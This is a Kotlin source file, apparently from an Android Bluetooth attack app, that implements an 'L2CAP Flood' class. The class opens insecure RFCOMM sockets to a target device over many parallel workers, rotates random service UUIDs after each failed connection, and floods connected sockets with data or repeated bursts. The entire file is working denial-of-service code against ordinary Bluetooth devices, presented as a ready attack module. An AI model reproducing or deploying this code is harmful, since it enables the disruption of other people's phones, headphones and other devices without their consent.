package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import androidx.core.content.ContextCompat.getSystemService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.IOException
import java.util.Collections
import java.util.UUID

/**
 * L2CAP Flood (classic): opens RFCOMM sockets towards the target using random
 * service UUIDs and floods each connected socket with data.
 * This is the technique the app originally shipped with.
 */
class L2capFloodAttack(
    private val targetAddress: String,
    private val threads: Int = 8,
    private val rateDelayMs: Int = 0,
    private val payloadPattern: PayloadPattern = PayloadPattern.FIXED,
    private val payloadSize: Int = 0,
    private val bombard: Boolean = false
) : BluetoothAttack {

    override val displayName = AttackType.L2CAP_FLOOD.displayName
    override val description = AttackType.L2CAP_FLOOD.description

    private var bluetoothAdapter: BluetoothAdapter? = null
    private val sockets = Collections.synchronizedList(mutableListOf<BluetoothSocket>())
    private var scope: CoroutineScope? = null
    @Volatile
    private var running = false

    override fun isRunning() = running

    @SuppressLint("MissingPermission")
    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        bluetoothAdapter = getSystemService(context, BluetoothManager::class.java)?.adapter
        val device: BluetoothDevice? = bluetoothAdapter?.getRemoteDevice(targetAddress)
        if (device == null) {
            running = false
            return
        }

        val workerCount = threads.coerceIn(1, 64)
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        onLog("[THREAD] L2CAP Flood iniciado (objetivo $targetAddress, $workerCount worker(s))")

        repeat(workerCount) { worker ->
            scope!!.launch {
                val baseUUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
                var successfulUUID: UUID? = null
                while (isActive && running) {
                    val uuid = successfulUUID ?: baseUUID
                    var socket: BluetoothSocket? = null
                    try {
                        socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                        socket.connect()
                        if (socket.isConnected) {
                            successfulUUID = uuid
                            if (bombard) {
                                // Bombard: one burst then close, cycle fast
                                val size = if (payloadSize > 0) payloadSize else 600
                                socket.outputStream.write(payloadPattern.buffer(size))
                                onLog("[$worker][DATA] Ráfaga enviada (bombardeo)")
                                runCatching { socket.close() }
                                jitterDelay(maxOf(50, rateDelayMs))
                            } else {
                                sockets.add(socket)
                                onLog("[$worker][CONN] Conexión establecida (UUID $uuid)")
                                FloodSupport.flood(socket, payloadPattern, payloadSize, rateDelayMs, { running }, onLog, "$worker")
                                sockets.remove(socket)
                                break
                            }
                        }
                    } catch (err: IOException) {
                        runCatching { socket?.close() }
                        successfulUUID = UUID.fromString(
                            UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB"
                        )
                        if (isActive && running) onLog("[$worker][RETRY] Intento fallido, UUID rotado")
                        jitterDelay(maxOf(100, rateDelayMs))
                    }
                }
            }
        }
    }

    private suspend fun floodSocket(socket: BluetoothSocket, onLog: (String) -> Unit, worker: Int) {
        FloodSupport.flood(socket, payloadPattern, payloadSize, rateDelayMs, { running }, onLog, "$worker")
    }

    override fun stop() {
        running = false
        scope?.cancel()
        scope = null
        synchronized(sockets) {
            sockets.forEach { s -> runCatching { s.close() } }
            sockets.clear()
        }
    }
}
